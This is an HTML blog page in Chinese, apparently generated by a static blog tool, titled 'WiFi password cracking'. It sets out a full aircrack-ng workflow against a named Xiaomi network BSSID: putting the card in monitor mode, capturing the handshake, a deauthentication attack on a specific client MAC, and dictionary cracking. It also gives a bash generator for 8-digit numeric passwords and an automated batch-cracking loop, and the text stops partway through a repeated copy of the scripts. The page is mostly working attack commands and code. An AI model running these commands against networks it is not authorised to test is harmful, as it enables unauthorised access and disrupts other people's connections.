@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <script src='https://blog.meekdai.com/Gmeek/plugins/GmeekVercount.js'></script>
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 命令
+```shell
+# 查看可用网卡
+airmon-ng 
+
+# 启动监听
+airmon-ng start wlan0
+
+# 查看网卡名字
+ifconfig
+
+#扫描 
+airodump-ng wlan0mon
+
+#开始抓包
+airodump-ng wlan0mon -c 1 --bssid 44:F7:70:28:D1:32 -w ./344c 
+
+# 发送10次ACK攻击
+aireplay-ng -0 10 -a 44:F7:70:28:D1:32 -c 58:B6:23:C0:47:98 wlan0mo
+
+#字典去重
+cat ./wpa-dictionary-master/common.txt | python3 ./wpa-dictionary-master/normalize.py > clean_common.txt
+
+#暴力破解
+aircrack-ng -w ./password_10000000_to_10999999.txt ./handshake-01.cap -b 44:F7:70:28:D1:32
+
+#脚本破解
+python3 test_passwords.py ./test_dict.txt ./handshake-01.cap
+```
+
+# 抓包文件
+
+[1.log](https://github.com/user-attachments/files/20983910/1.log)
+
+- 受上传限制，下载后更名为handshake-01.cap
+
+
+# 生成8位纯数字密码脚本
+```shell
+#!/bin/bash
+
+# 按范围生成8位纯数字密码的脚本
+
+echo '=== 8位纯数字密码范围生成器 ==='
+
+# 主函数
+main() {
+    if [ '$1' = '-h' ] || [ '$1' = '--help' ]; then
+        echo '用法: $0 [选项]'
+        echo '选项:'
+        echo '  -s START    起始数字 (默认: 10000000)'
+        echo '  -e END      结束数字 (默认: 19999999)'
+        echo '  -o OUTPUT   输出文件名前缀 (默认: password)'
+        echo '  -h, --help  显示帮助信息'
+        echo ''
+        echo '示例:'
+        echo '  $0 -s 10000000 -e 19999999'
+        echo '  $0 -s 20000000 -e 29999999 -o xiaomi'
+        echo '  $0 -s 12345678 -e 12345688'
+        exit 0
+    fi
+    
+    # 默认参数
+    start_num=10000000
+    end_num=19999999
+    output_prefix='password'
+    
+    # 解析命令行参数
+    while [ $# -gt 0 ]; do
+        case $1 in
+            -s)
+                start_num='$2'
+                shift 2
+                ;;
+            -e)
+                end_num='$2'
+                shift 2
+                ;;
+            -o)
+                output_prefix='$2'
+                shift 2
+                ;;
+            *)
+                echo '未知参数: $1'
+                echo '使用 -h 查看帮助'
+                exit 1
+                ;;
+        esac
+    done
+    
+    # 验证参数
+    if ! [[ '$start_num' =~ ^[0-9]+$ ]] || [ '$start_num' -lt 10000000 ] || [ '$start_num' -gt 99999999 ]; then
+        echo '错误: 起始数字必须是8位数字 (10000000-99999999)'
+        exit 1
+    fi
+    
+    if ! [[ '$end_num' =~ ^[0-9]+$ ]] || [ '$end_num' -lt 10000000 ] || [ '$end_num' -gt 99999999 ]; then
+        echo '错误: 结束数字必须是8位数字 (10000000-99999999)'
+        exit 1
+    fi
+    
+    if [ '$start_num' -gt '$end_num' ]; then
+        echo '错误: 起始数字不能大于结束数字'
+        exit 1
+    fi
+    
+    # 计算范围大小
+    range_size=$((end_num - start_num + 1))
+    
+    # 检查范围大小是否合理
+    if [ $range_size -gt 10000000 ]; then
+        echo '警告: 范围过大 ($range_size 个密码)，建议分批生成'
+        echo '当前范围: $start_num 到 $end_num'
+        read -p '是否继续? (y/N): ' confirm
+        if [[ ! $confirm =~ ^[Yy]$ ]]; then
+            echo '已取消'
+            exit 0
+        fi
+    fi
+    
+    # 生成文件名
+    filename='${output_prefix}_${start_num}_to_${end_num}.txt'
+    
+    echo '起始数字: $start_num'
+    echo '结束数字: $end_num'
+    echo '密码数量: $range_size'
+    echo '输出文件: $filename'
+    echo ''
+    
+    # 检查磁盘空间
+    estimated_size=$((range_size * 9))  # 每个密码8位+换行符
+    available_space=$(df . | awk 'NR==2 {print $4}')
+    if [ $estimated_size -gt $available_space ]; then
+        echo '错误: 磁盘空间不足'
+        echo '需要空间: ${estimated_size} 字节'
+        echo '可用空间: ${available_space} 字节'
+        exit 1
+    fi
+    
+    echo '开始生成密码...'
+    
+    # 生成密码
+    seq $start_num $end_num > '$filename'
+    
+    # 检查生成结果
+    actual_count=$(wc -l < '$filename')
+    file_size=$(wc -c < '$filename')
+    
+    echo ''
+    echo '✅ 密码生成完成!'
+    echo '📁 文件: $filename'
+    echo '📊 实际生成: $actual_count 个密码'
+    echo '💾 文件大小: $file_size 字节'
+    echo ''
+    echo '前10个密码预览:'
+    head -10 '$filename'
+    
+    if [ $actual_count -gt 10 ]; then
+        echo '...'
+        echo '后10个密码预览:'
+        tail -10 '$filename'
+    fi
+}
+
+# 运行主函数
+main '$@' 
+```
+
+# 自动跑任务脚本
+```shell
+#!/bin/bash
+
+# 8位纯数字密码完整破解脚本
+# 范围：10000000-99999999 (9000万个密码)
+
+echo '=== 8位纯数字密码完整破解脚本 ==='
+echo '开始时间: $(date)'
+echo ''
+
+# 创建报告文件
+report_file='crack_report_$(date +%Y%m%d_%H%M%S).txt'
+echo '8位纯数字密码破解报告' > '$report_file'
+echo '开始时间: $(date)' >> '$report_file'
+echo '目标网络: Xiaomi_344C (44:F7:70:28:D1:32)' >> '$report_file'
+echo '========================================' >> '$report_file'
+
+# 定义范围参数
+start_range=10000000
+end_range=99999999
+batch_size=1000000  # 每批100万个密码
+
+# 计算总批次数
+total_batches=$(((end_range - start_range + 1) / batch_size))
+current_batch=1
+
+echo '总范围: $start_range 到 $end_range'
+echo '每批大小: $batch_size 个密码'
+echo '总批次数: $total_batches'
+echo ''
+
+# 主循环
+for ((batch_start=start_range; batch_start<=end_range; batch_start+=batch_size)); do
+    batch_end=$((batch_start + batch_size - 1))
+    
+    # 确保不超过最大范围
+    if [ $batch_end -gt $end_range ]; then
+        batch_end=$end_range
+    fi
+    
+    echo '========================================'
+    echo '批次 $current_batch/$total_batches'
+    echo '范围: $batch_start 到 $batch_end'
+    echo '开始时间: $(date)'
+    echo ''
+    
+    # 生成密码文件
+    echo '正在生成密码文件...'
+    ./generate_password.sh -s $batch_start -e $batch_end -o 'batch_${current_batch}'
+    
+    if [ $? -ne 0 ]; then
+        echo '❌ 密码生成失败，跳过此批次'
+        echo '批次 $current_batch: $batch_start-$batch_end - 生成失败' >> '$report_file'
+        current_batch=$((current_batch + 1))
+        continue
+    fi
+    
+    password_file='batch_${current_batch}_${batch_start}_to_${batch_end}.txt'
+    
+    # 检查文件是否存在
+    if [ ! -f '$password_file' ]; then
+        echo '❌ 密码文件不存在: $password_file'
+        echo '批次 $current_batch: $batch_start-$batch_end - 文件不存在' >> '$report_file'
+        current_batch=$((current_batch + 1))
+        continue
+    fi
+    
+    # 开始破解
+    echo '开始破解...'
+    echo '使用字典: $password_file'
+    echo ''
+    
+    # 运行aircrack-ng并捕获输出
+    crack_output=$(aircrack-ng -w '$password_file' ./handshake-01.cap -b 44:F7:70:28:D1:32 2>&1)
+    crack_result=$?
+    
+    # 检查是否找到密码
+    if echo '$crack_output' | grep -q 'KEY FOUND'; then
+        password=$(echo '$crack_output' | grep 'KEY FOUND' | awk '{print $4}')
+        echo '🎉 密码找到了!'
+        echo '密码: $password'
+        echo '范围: $batch_start 到 $batch_end'
+        echo ''
+        
+        # 记录到报告
+        echo '✅ 成功找到密码!' >> '$report_file'
+        echo '密码: $password' >> '$report_file'
+        echo '范围: $batch_start 到 $batch_end' >> '$report_file'
+        echo '批次: $current_batch' >> '$report_file'
+        echo '结束时间: $(date)' >> '$report_file'
+        
+        # 删除密码文件
+        rm -f '$password_file'
+        echo '已删除密码文件: $password_file'
+        
+        echo '破解完成！密码已找到。">
+<meta property="og:title" content="WIFI密码破解">
+<meta property="og:description" content="# 命令
+```shell
+# 查看可用网卡
+airmon-ng 
+
+# 启动监听
+airmon-ng start wlan0
+
+# 查看网卡名字
+ifconfig
+
+#扫描 
+airodump-ng wlan0mon
+
+#开始抓包
+airodump-ng wlan0mon -c 1 --bssid 44:F7:70:28:D1:32 -w ./344c 
+
+# 发送10次ACK攻击
+aireplay-ng -0 10 -a 44:F7:70:28:D1:32 -c 58:B6:23:C0:47:98 wlan0mo
+
+#字典去重
+cat ./wpa-dictionary-master/common.txt | python3 ./wpa-dictionary-master/normalize.py > clean_common.txt
+
+#暴力破解
+aircrack-ng -w ./password_10000000_to_10999999.txt ./handshake-01.cap -b 44:F7:70:28:D1:32
+
+#脚本破解
+python3 test_passwords.py ./test_dict.txt ./handshake-01.cap
+```
+
+# 抓包文件
+
+[1.log](https://github.com/user-attachments/files/20983910/1.log)
+
+- 受上传限制，下载后更名为handshake-01.cap
+
+
+# 生成8位纯数字密码脚本
+```shell
+#!/bin/bash
+
+# 按范围生成8位纯数字密码的脚本
+
+echo '=== 8位纯数字密码范围生成器 ==='
+
+# 主函数
+main() {
+    if [ '$1' = '-h' ] || [ '$1' = '--help' ]; then
+        echo '用法: $0 [选项]'
+        echo '选项:'
+        echo '  -s START    起始数字 (默认: 10000000)'
+        echo '  -e END      结束数字 (默认: 19999999)'
+        echo '  -o OUTPUT   输出文件名前缀 (默认: password)'
+        echo '  -h, --help  显示帮助信息'
+        echo ''
+        echo '示例:'
+        echo '  $0 -s 10000000 -e 19999999'
+        echo '  $0 -s 20000000 -e 29999999 -o xiaomi'
+        echo '  $0 -s 12345678 -e 12345688'
+        exit 0
+    fi
+    
+    # 默认参数
+    start_num=10000000
+    end_num=19999999
+    output_prefix='password'
+    
+    # 解析命令行参数
+    while [ $# -gt 0 ]; do
+        case $1 in
+            -s)
+                start_num='$2'
+                shift 2
+                ;;
+            -e)
+                end_num='$2'
+                shift 2
+                ;;
+            -o)
+                output_prefix='$2'
+                shift 2
+                ;;
+            *)
+                echo '未知参数: $1'
+                echo '使用 -h 查看帮助'
+                exit 1
+                ;;
+        esac
+    done
+    
+    # 验证参数
+    if ! [[ '$start_num' =~ ^[0-9]+$ ]] || [ '$start_num' -lt 10000000 ] || [ '$start_num' -gt 99999999 ]; then
+        echo '错误: 起始数字必须是8位数字 (10000000-99999999)'
+        exit 1
+    fi
+    
+    if ! [[ '$end_num' =~ ^[0-9]+$ ]] || [ '$end_num' -lt 10000000 ] || [ '$end_num' -gt 99999999 ]; then
+        echo '错误: 结束数字必须是8位数字 (10000000-99999999)'
+        exit 1
+    fi
+    
+    if [ '$start_num' -gt '$end_num' ]; then
+        echo '错误: 起始数字不能大于结束数字'
+        exit 1
+    fi
+    
+    # 计算范围大小
+    range_size=$((end_num - start_num + 1))
+    
+    # 检查范围大小是否合理
+    if [ $range_size -gt 10000000 ]; then
+        echo '警告: 范围过大 ($range_size 个密码)，建议分批生成'
+        echo '当前范围: $start_num 到 $end_num'
+        read -p '是否继续? (y/N): ' confirm
+        if [[ ! $confirm =~ ^[Yy]$ ]]; then
+            echo '已取消'
+            exit 0
+        fi
+    fi
+    
+    # 生成文件名
+    filename='${output_prefix}_${start_num}_to_${end_num}.txt'
+    
+    echo '起始数字: $start_num'
+    echo '结束数字: $end_num'
+    echo '密码数量: $range_size'
+    echo '输出文件: $filename'
+    echo ''
+    
+    # 检查磁盘空间
+    estimated_size=$((range_size * 9))  # 每个密码8位+换行符
+    available_space=$(df . | awk 'NR==2 {print $4}')
+    if [ $estimated_size -gt $available_space ]; then
+        echo '错误: 磁盘空间不足'
+        echo '需要空间: ${estimated_size} 字节'
+        echo '可用空间: ${available_space} 字节'
+        exit 1
+    fi
+    
+    echo '开始生成密码...'
+    
+    # 生成密码
+    seq $start_num $end_num > '$filename'
+    
+    # 检查生成结果
+    actual_count=$(wc -l < '$filename')
+    file_size=$(wc -c < '$filename')
+    
+    echo ''
+    echo '✅ 密码生成完成!'
+    echo '📁 文件: $filename'
+    echo '📊 实际生成: $actual_count 个密码'
+    echo '💾 文件大小: $file_size 字节'
+    echo ''
+    echo '前10个密码预览:'
+    head -10 '$filename'
+    
+    if [ $actual_count -gt 10 ]; then
+        echo '...'
+        echo '后10个密码预览:'
+        tail -10 '$filename'
+    fi
+}
+
+# 运行主函数
+main '$@' 
+```
+
+# 自动跑任务脚本
+```shell
+#!/bin/bash
+
+# 8位纯数字密码完整破解脚本
+# 范围：10000000-99999999 (9000万个密码)
+
+echo '=== 8位纯数字密码完整破解脚本 ==='
+echo '开始时间: $(date)'
+echo ''
+
+# 创建报告文件
+report_file='crack_report_$(date +%Y%m%d_%H%M%S).txt'
+echo '8位纯数字密码破解报告' > '$report_file'
+echo '开始时间: $(date)' >> '$report_file'
+echo '目标网络: Xiaomi_344C (44:F7:70:28:D1:32)' >> '$report_file'
+echo '========================================' >> '$report_file'
+
+# 定义范围参数
+start_range=10000000
+end_range=99999999
+batch_size=1000000  # 每批100万个密码
+
+# 计算总批次数
+total_batches=$(((end_range - start_range + 1) / batch_size))
+current_batch=1
+
+echo '总范围: $start_range 到 $end_range'
+echo '每批大小: $batch_size 个密码'
+echo '总批次数: $total_batches'
+echo ''
+
+# 主循环
+for ((batch_start=start_range; batch_start<=end_range; batch_start+=batch_size)); do
+    batch_end=$((batch_start + batch_size - 1))
+    
+    # 确保不超过最大范围
+    if [ $batch_end -gt $end_range ]; then
+        batch_end=$end_range
+    fi
+    
+    echo '========================================'
+    echo '批次 $current_batch/$total_batches'
+    echo '范围: $batch_start 到 $batch_end'
+    echo '开始时间: $(date)'
+    echo ''
+    
+    # 生成密码文件
+    echo '正在生成密码文件...'
+    ./generate_password.sh -s $batch_start -e $batch_end -o 'batch_${current_batch}'
+    
+    if [ $? -ne 0 ]; then
+        echo '❌ 密码生成失败，跳过此批次'
+        echo '批次 $current_batch: $batch_start-$batch_end - 生成失败' >> '$report_file'
+        current_batch=$((current_batch + 1))
+        continue
+    fi
+    
+    password_file='batch_${current_batch}_${batch_start}_to_${batch_end}.txt'
+    
+    # 检查文件是否存在
+    if [ ! -f '$password_file' ]; then
+        echo '❌ 密码文件不存在: $password_file'
+        echo '批次 $current_batch: $batch_start-$batch_end - 文件不存在' >> '$report_file'
+        current_batch=$((current_batch + 1))
+        continue
+    fi
+    
+    # 开始破解
+    echo '开始破解...'
+    echo '使用字典: $password_file'
+    echo ''
+    
+    # 运行aircrack-ng并捕获输出
+    crack_output=$(aircrack-ng -w '$password_file' ./handshake-01.cap -b 44:F7:70:28:D1:32 2>&1)
+    crack_result=$?
+    
+    # 检查是否找到密码
+    if echo '$crack_output' | grep -q 'KEY FOUND'; then
+        password=$(echo '$crack_output' | grep 'KEY FOUND' | awk '{print $4}')
+        echo '🎉 密码找到了!'
+        echo '密码: $password'
+        echo '范围: $batch_start 到 $batch_end'
+        echo ''
+        
+        # 记录到报告
+        echo '✅ 成功找到密码!' >> '$report_file'
+        echo '密码: $password' >> '$report_file'
+        echo '范围: $batch_start 到 $batch_end' >> '$report_file'
+        echo '批次: $current_batch' >> '$report_file'
+        echo '结束时间: $(date)' >> '$report_file'
+        
+        # 删除密码文件
+        rm -f '$password_file'
+        echo '已删除密码文件: $password_file'
+        
+        echo '破解完成！密码已找到。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://tangrenbin.github.io/post/WIFI-mi-ma-po-jie.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>WIFI密码破解</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">WIFI密码破解</h1>
+<div class="title-right">
+    <a href="https://tangrenbin.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/Tangrenbin/tangrenbin.github.io/issues/29" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>命令</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 查看可用网卡</span>
+airmon-ng 
+
+<span class="pl-c"><span class="pl-c">#</span> 启动监听</span>
+airmon-ng start wlan0
+
+<span class="pl-c"><span class="pl-c">#</span> 查看网卡名字</span>
+ifconfig
+
+<span class="pl-c"><span class="pl-c">#</span>扫描 </span>
+airodump-ng wlan0mon
+
+<span class="pl-c"><span class="pl-c">#</span>开始抓包</span>
+airodump-ng wlan0mon -c 1 --bssid 44:F7:70:28:D1:32 -w ./344c 
+
+<span class="pl-c"><span class="pl-c">#</span> 发送10次ACK攻击</span>
+aireplay-ng -0 10 -a 44:F7:70:28:D1:32 -c 58:B6:23:C0:47:98 wlan0mo
+
+<span class="pl-c"><span class="pl-c">#</span>字典去重</span>
+cat ./wpa-dictionary-master/common.txt <span class="pl-k">|</span> python3 ./wpa-dictionary-master/normalize.py <span class="pl-k">&gt;</span> clean_common.txt
+
+<span class="pl-c"><span class="pl-c">#</span>暴力破解</span>
+aircrack-ng -w ./password_10000000_to_10999999.txt ./handshake-01.cap -b 44:F7:70:28:D1:32
+
+<span class="pl-c"><span class="pl-c">#</span>脚本破解</span>
+python3 test_passwords.py ./test_dict.txt ./handshake-01.cap</pre></div>
+<h1>抓包文件</h1>
+<p><a href="https://github.com/user-attachments/files/20983910/1.log">1.log</a></p>
+<ul>
+<li>受上传限制，下载后更名为handshake-01.cap</li>
+</ul>
+<h1>生成8位纯数字密码脚本</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 按范围生成8位纯数字密码的脚本</span>
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>=== 8位纯数字密码范围生成器 ===<span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 主函数</span>
+<span class="pl-en">main</span>() {
+    <span class="pl-k">if</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$1</span><span class="pl-pds">"</span></span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>-h<span class="pl-pds">"</span></span> ] <span class="pl-k">||</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$1</span><span class="pl-pds">"</span></span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>--help<span class="pl-pds">"</span></span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>用法: <span class="pl-smi">$0</span> [选项]<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>选项:<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>  -s START    起始数字 (默认: 10000000)<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>  -e END      结束数字 (默认: 19999999)<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>  -o OUTPUT   输出文件名前缀 (默认: password)<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>  -h, --help  显示帮助信息<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>示例:<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>  <span class="pl-smi">$0</span> -s 10000000 -e 19999999<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>  <span class="pl-smi">$0</span> -s 20000000 -e 29999999 -o xiaomi<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>  <span class="pl-smi">$0</span> -s 12345678 -e 12345688<span class="pl-pds">"</span></span>
+        <span class="pl-c1">exit</span> 0
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 默认参数</span>
+    start_num=10000000
+    end_num=19999999
+    output_prefix=<span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 解析命令行参数</span>
+    <span class="pl-k">while</span> [ <span class="pl-smi">$#</span> <span class="pl-k">-gt</span> 0 ]<span class="pl-k">;</span> <span class="pl-k">do</span>
+        <span class="pl-k">case</span> <span class="pl-smi">$1</span> <span class="pl-k">in</span>
+            -s)
+                start_num=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span><span class="pl-pds">"</span></span>
+                <span class="pl-c1">shift</span> 2
+                ;;
+            -e)
+                end_num=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span><span class="pl-pds">"</span></span>
+                <span class="pl-c1">shift</span> 2
+                ;;
+            -o)
+                output_prefix=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span><span class="pl-pds">"</span></span>
+                <span class="pl-c1">shift</span> 2
+                ;;
+            <span class="pl-k">*</span>)
+                <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>未知参数: <span class="pl-smi">$1</span><span class="pl-pds">"</span></span>
+                <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>使用 -h 查看帮助<span class="pl-pds">"</span></span>
+                <span class="pl-c1">exit</span> 1
+                ;;
+        <span class="pl-k">esac</span>
+    <span class="pl-k">done</span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 验证参数</span>
+    <span class="pl-k">if</span> <span class="pl-k">!</span> [[ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$start_num</span><span class="pl-pds">"</span></span> <span class="pl-k">=~</span> ^[0-9]+$ ]] <span class="pl-k">||</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$start_num</span><span class="pl-pds">"</span></span> <span class="pl-k">-lt</span> 10000000 ] <span class="pl-k">||</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$start_num</span><span class="pl-pds">"</span></span> <span class="pl-k">-gt</span> 99999999 ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>错误: 起始数字必须是8位数字 (10000000-99999999)<span class="pl-pds">"</span></span>
+        <span class="pl-c1">exit</span> 1
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-k">if</span> <span class="pl-k">!</span> [[ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$end_num</span><span class="pl-pds">"</span></span> <span class="pl-k">=~</span> ^[0-9]+$ ]] <span class="pl-k">||</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$end_num</span><span class="pl-pds">"</span></span> <span class="pl-k">-lt</span> 10000000 ] <span class="pl-k">||</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$end_num</span><span class="pl-pds">"</span></span> <span class="pl-k">-gt</span> 99999999 ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>错误: 结束数字必须是8位数字 (10000000-99999999)<span class="pl-pds">"</span></span>
+        <span class="pl-c1">exit</span> 1
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-k">if</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$start_num</span><span class="pl-pds">"</span></span> <span class="pl-k">-gt</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$end_num</span><span class="pl-pds">"</span></span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>错误: 起始数字不能大于结束数字<span class="pl-pds">"</span></span>
+        <span class="pl-c1">exit</span> 1
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 计算范围大小</span>
+    range_size=<span class="pl-s"><span class="pl-pds">$((</span>end_num <span class="pl-k">-</span> start_num <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 检查范围大小是否合理</span>
+    <span class="pl-k">if</span> [ <span class="pl-smi">$range_size</span> <span class="pl-k">-gt</span> 10000000 ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>警告: 范围过大 (<span class="pl-smi">$range_size</span> 个密码)，建议分批生成<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>当前范围: <span class="pl-smi">$start_num</span> 到 <span class="pl-smi">$end_num</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">read</span> -p <span class="pl-s"><span class="pl-pds">"</span>是否继续? (y/N): <span class="pl-pds">"</span></span> confirm
+        <span class="pl-k">if</span> [[ <span class="pl-k">!</span> <span class="pl-smi">$confirm</span> <span class="pl-k">=~</span> ^[Yy]$ ]]<span class="pl-k">;</span> <span class="pl-k">then</span>
+            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>已取消<span class="pl-pds">"</span></span>
+            <span class="pl-c1">exit</span> 0
+        <span class="pl-k">fi</span>
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 生成文件名</span>
+    filename=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">${output_prefix}</span>_<span class="pl-smi">${start_num}</span>_to_<span class="pl-smi">${end_num}</span>.txt<span class="pl-pds">"</span></span>
+    
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>起始数字: <span class="pl-smi">$start_num</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>结束数字: <span class="pl-smi">$end_num</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>密码数量: <span class="pl-smi">$range_size</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>输出文件: <span class="pl-smi">$filename</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 检查磁盘空间</span>
+    estimated_size=<span class="pl-s"><span class="pl-pds">$((</span>range_size <span class="pl-k">*</span> <span class="pl-c1">9</span><span class="pl-pds">))</span></span>  <span class="pl-c"><span class="pl-c">#</span> 每个密码8位+换行符</span>
+    available_space=<span class="pl-s"><span class="pl-pds">$(</span>df <span class="pl-c1">.</span> <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>NR==2 {print $4}<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
+    <span class="pl-k">if</span> [ <span class="pl-smi">$estimated_size</span> <span class="pl-k">-gt</span> <span class="pl-smi">$available_space</span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>错误: 磁盘空间不足<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>需要空间: <span class="pl-smi">${estimated_size}</span> 字节<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>可用空间: <span class="pl-smi">${available_space}</span> 字节<span class="pl-pds">"</span></span>
+        <span class="pl-c1">exit</span> 1
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>开始生成密码...<span class="pl-pds">"</span></span>
+    
